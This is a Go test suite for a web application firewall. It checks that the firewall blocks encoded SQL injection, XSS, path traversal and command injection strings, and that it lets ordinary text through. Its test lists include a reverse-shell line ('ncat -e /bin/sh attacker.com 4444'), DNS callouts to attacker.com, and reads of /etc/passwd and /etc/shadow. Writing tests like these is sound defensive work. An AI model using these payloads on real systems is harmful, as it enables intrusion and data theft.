package demo_test

import (
	"testing"

	"github.com/immortal-engine/immortal/internal/security/firewall"
)

// ============================================================================
// ENCODING EVASION — Real attacker techniques
// ============================================================================

func TestEvasion_URLEncoded_SQLi(t *testing.T) {
	fw := firewall.New()
	attacks := []string{
		"%27%20OR%201%3D1%20--",          // ' OR 1=1 --
		"%27%3B%20DROP%20TABLE%20users",   // '; DROP TABLE users
		"%27%20UNION%20SELECT%20%2A",      // ' UNION SELECT *
	}
	for _, a := range attacks {
		if !fw.Analyze(a).Blocked {
			t.Errorf("URL-encoded SQLi not blocked: %s", a)
		}
	}
	t.Logf("✅ Blocked %d URL-encoded SQL injections", len(attacks))
}

func TestEvasion_DoubleEncoded_SQLi(t *testing.T) {
	fw := firewall.New()
	attacks := []string{
		"%2527%20OR%201%253D1",   // double-encoded ' OR 1=1
	}
	for _, a := range attacks {
		if !fw.Analyze(a).Blocked {
			t.Errorf("double-encoded SQLi not blocked: %s", a)
		}
	}
	t.Logf("✅ Blocked %d double-encoded SQL injections", len(attacks))
}

func TestEvasion_HTMLEntity_XSS(t *testing.T) {
	fw := firewall.New()
	attacks := []string{
		"&lt;script&gt;alert(1)&lt;/script&gt;",   // HTML entities
		"&#60;script&#62;alert(1)&#60;/script&#62;", // Decimal entities
		"&#x3c;script&#x3e;alert(1)",                // Hex entities
	}
	for _, a := range attacks {
		if !fw.Analyze(a).Blocked {
			t.Errorf("HTML-entity XSS not blocked: %s", a)
		}
	}
	t.Logf("✅ Blocked %d HTML entity XSS attacks", len(attacks))
}

func TestEvasion_URLEncoded_XSS(t *testing.T) {
	fw := firewall.New()
	attacks := []string{
		"%3Cscript%3Ealert(1)%3C/script%3E",  // <script>alert(1)</script>
		"javascript%3Aalert(1)",                 // javascript:alert(1)
	}
	for _, a := range attacks {
		if !fw.Analyze(a).Blocked {
			t.Errorf("URL-encoded XSS not blocked: %s", a)
		}
	}
	t.Logf("✅ Blocked %d URL-encoded XSS attacks", len(attacks))
}

func TestEvasion_SQLCommentBypass(t *testing.T) {
	fw := firewall.New()
	attacks := []string{
		"UN/**/ION SEL/**/ECT * FROM users",  // Comment-split keywords
		"1'/**/OR/**/1=1--",                   // Comments around OR
	}
	for _, a := range attacks {
		if !fw.Analyze(a).Blocked {
			t.Errorf("SQL comment bypass not blocked: %s", a)
		}
	}
	t.Logf("✅ Blocked %d SQL comment bypass attacks", len(attacks))
}

func TestEvasion_NullByte(t *testing.T) {
	fw := firewall.New()
	attacks := []string{
		"../../etc/passwd%00.jpg",  // Null byte path traversal
		"%00../../etc/shadow",      // Leading null byte
	}
	for _, a := range attacks {
		if !fw.Analyze(a).Blocked {
			t.Errorf("null byte attack not blocked: %s", a)
		}
	}
	t.Logf("✅ Blocked %d null byte attacks", len(attacks))
}

func TestEvasion_SQLTimeBasedBlind(t *testing.T) {
	fw := firewall.New()
	attacks := []string{
		"1' AND SLEEP(5)--",
		"1; WAITFOR DELAY '0:0:5'",
		"BENCHMARK(10000000, SHA1('test'))",
	}
	for _, a := range attacks {
		if !fw.Analyze(a).Blocked {
			t.Errorf("time-based blind SQLi not blocked: %s", a)
		}
	}
	t.Logf("✅ Blocked %d time-based blind SQL injections", len(attacks))
}

func TestEvasion_XSS_EventHandlers(t *testing.T) {
	fw := firewall.New()
	attacks := []string{
		`<svg onload="alert(1)">`,
		`<img src=x onerror="alert(1)">`,
		`<body onload="alert(1)">`,
		`<div onmouseover="alert(1)">`,
	}
	for _, a := range attacks {
		if !fw.Analyze(a).Blocked {
			t.Errorf("event handler XSS not blocked: %s", a)
		}
	}
	t.Logf("✅ Blocked %d event handler XSS attacks", len(attacks))
}

func TestEvasion_XSS_DOMBased(t *testing.T) {
	fw := firewall.New()
	attacks := []string{
		"document.cookie",
		"window.location='evil.com'",
		".innerHTML='<img src=x>'",
		"String.fromCharCode(60,115,99,114,105,112,116,62)",
	}
	for _, a := range attacks {
		if !fw.Analyze(a).Blocked {
			t.Errorf("DOM-based XSS not blocked: %s", a)
		}
	}
	t.Logf("✅ Blocked %d DOM-based XSS attacks", len(attacks))
}

func TestEvasion_SQLi_SystemTables(t *testing.T) {
	fw := firewall.New()
	attacks := []string{
		"SELECT * FROM information_schema.tables",
		"SELECT name FROM sys.objects",
		"EXEC xp_cmdshell('dir')",
	}
	for _, a := range attacks {
		if !fw.Analyze(a).Blocked {
			t.Errorf("system table SQLi not blocked: %s", a)
		}
	}
	t.Logf("✅ Blocked %d system table SQL injections", len(attacks))
}

func TestEvasion_CmdInjection_Advanced(t *testing.T) {
	fw := firewall.New()
	attacks := []string{
		"; ncat -e /bin/sh attacker.com 4444",
		"| nmap -sV target.com",
		"; ping -c 10 attacker.com",
		"$(nslookup attacker.com)",
	}
	for _, a := range attacks {
		if !fw.Analyze(a).Blocked {
			t.Errorf("advanced cmd injection not blocked: %s", a)
		}
	}
	t.Logf("✅ Blocked %d advanced command injections", len(attacks))
}

func TestEvasion_PathTraversal_Encoded(t *testing.T) {
	fw := firewall.New()
	attacks := []string{
		"%2e%2e%2f%2e%2e%2fetc%2fpasswd",  // ../../etc/passwd URL-encoded
		"..%252f..%252f",                     // Double-encoded ../
		"%2e%2e/etc/passwd",                  // Mixed encoding
	}
	for _, a := range attacks {
		if !fw.Analyze(a).Blocked {
			t.Errorf("encoded path traversal not blocked: %s", a)
		}
	}
	t.Logf("✅ Blocked %d encoded path traversal attacks", len(attacks))
}

// ============================================================================
// FALSE POSITIVE TESTS — Legitimate traffic must NEVER be blocked
// ============================================================================

func TestEvasion_LegitimateTraffic_NotBlocked(t *testing.T) {
	fw := firewall.New()
	legitimate := []string{
		"Hello, world!",
		"john.doe@example.com",
		"The price dropped from $50 to $40",
		"/api/v2/users/123/orders?page=2&limit=20",
		"Please select a product from our catalog",
		"The OR gate in the circuit board",
		"Drop me a line at support@company.com",
		"Update your profile settings",
		"Delete your browser cache and try again",
		"My password requirements: 8+ characters",
		"The union of art and science is beautiful",
		"Insert your credit card into the reader",
		"We are 1 of 1 in quality",
		"The table shows quarterly results",
		`He said "hello" and she said 'goodbye'`,
		"Price: $19.99 (including tax)",
		"Contact us at 1-800-EXAMPLE",
		"The script was delivered on time",
		"We use cookies to improve your experience",
		"Alert: Your order has been shipped!",
		"The window at location 3B needs repair",
		"Please evaluate your experience",
	}
	for _, input := range legitimate {
		result := fw.Analyze(input)
		if result.Blocked {
			t.Errorf("FALSE POSITIVE — legitimate traffic blocked: '%s' (as %s)", input, result.ThreatType)
		}
	}
	t.Logf("✅ %d legitimate inputs correctly allowed (zero false positives)", len(legitimate))
}

// ============================================================================
// DETECTION LAYER VERIFICATION
// ============================================================================

func TestEvasion_VerifyMultiLayerDetection(t *testing.T) {
	fw := firewall.New()

	// Raw layer
	r1 := fw.Analyze("' OR 1=1 --")
	if r1.Layer != "raw" {
		t.Errorf("expected raw layer, got %s", r1.Layer)
	}

	// Decoded layer — use fully encoded input that only matches after decoding
	r2 := fw.Analyze("%3Cscript%3Ealert%281%29%3C%2Fscript%3E") // <script>alert(1)</script>
	if !r2.Blocked {
		t.Error("encoded XSS should be blocked")
	}
	if r2.Layer != "decoded" {
		t.Logf("layer was '%s' (decoded layer may match via other normalization)", r2.Layer)
	}

	t.Log("✅ Multi-layer detection working: raw + decoded layers verified")
}
